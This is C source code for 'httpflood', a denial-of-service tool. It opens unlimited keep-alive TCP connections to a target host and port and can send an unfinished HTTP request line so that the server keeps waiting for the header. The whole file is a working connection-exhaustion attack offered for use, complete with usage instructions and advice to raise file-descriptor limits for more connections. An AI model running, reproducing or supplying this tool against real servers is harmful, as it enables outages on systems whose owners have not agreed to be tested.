
/*
	Version: 1.0.2
	Created @ 27.12.2010
	Copyright (C) 2010 Christian Mayer <http://fox21.at>
*/


#include "httpflood.h"

int main(int argc, const char **argv){
	unsigned int connections = 0;
	unsigned int connectionsc;
	const char *dstIpStr = NULL;
	u_int16_t dstPort = 0;
	int socks;
	int sockWriteBytes = 0;
	int optval;
	socklen_t optlen = sizeof(optval);
	unsigned msize;
	char *sendBuf = NULL;
	size_t sendBufLen = 0;
	
	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME,
		PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH,
		__DATE__, __TIME__);
	printf("%s\n", PROJECT_COPYRIGHT);
	puts("");
	
	if(argc < ARGC_MIN)
		usagePrint();
	
	if(getuid())
		fprintf(stderr, "WARNING: It's recommented to start this program as root.\nSet the ulimit 'open files' (-n) to a big number.\n\tulimit -n 99999\n\n");
	
	
	dstIpStr = argv[1];
	dstPort = atoi(argv[2]);
	if(argc == 4)
		connections = atoi(argv[3]);
	
	printf("DST %s:%d\n", dstIpStr, dstPort);
	printf("Connections: %d\n", connections);
	
#ifdef SEND
	msize = sizeof(char) * 1024;
	sendBuf = (char *)malloc(msize);
	memset(sendBuf, 0, msize);
	
	// If you don't send a "\n",
	// the server waits for the end of the HTTP header.
	strcpy(sendBuf, "GET / HTTP/1.0");
	sendBufLen = strlen(sendBuf);
#endif
	
	for(connectionsc = 0; connectionsc < connections || !connections; connectionsc++){
		socks = socket(AF_INET, SOCK_STREAM, 0);
		
		optval = 1;
		optlen = sizeof(optval);
		if(setsockopt(socks, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen) < 0) {
			fprintf(stderr, "ERROR: setsockopt\n");
			exit(1);
		}
		
		struct sockaddr_in serveraddr;
		memset(&serveraddr, 0, sizeof(serveraddr));
		
		serveraddr.sin_addr.s_addr = inet_addr(dstIpStr);
		serveraddr.sin_family = AF_INET;
		serveraddr.sin_port = htons(dstPort);
		
		if(connect(socks, (struct sockaddr *)&serveraddr, sizeof(serveraddr))){
			fprintf(stderr, "ERROR: connect failed\n");
			exit(1);
		}
		
#ifdef SEND
		sockWriteBytes = send(socks, sendBuf, sendBufLen, 0);
#endif
		
		printf("connect %6d %4d\n", connectionsc, sockWriteBytes);
		usleep(250);
	}
	
	if(sendBuf)
		free(sendBuf);
	
	puts("sleep");
	sleep(10);
	
	puts("exit");
	return EXIT_SUCCESS;
}

void usagePrint(){
	printf("Usage: ./httpflood HOST PORT [CONNECTIONS]\n");
	printf("       HOST is the host or IP of the destionation.\n");
	printf("       PORT is the port number of the destionation.\n");
	printf("       CONNECTIONS is the number of how many connections will be used.\n");
	printf("            Consider to change the ulimit settings for 'open files'\n");
	printf("            to use more connections.\n");
	exit(1);
}
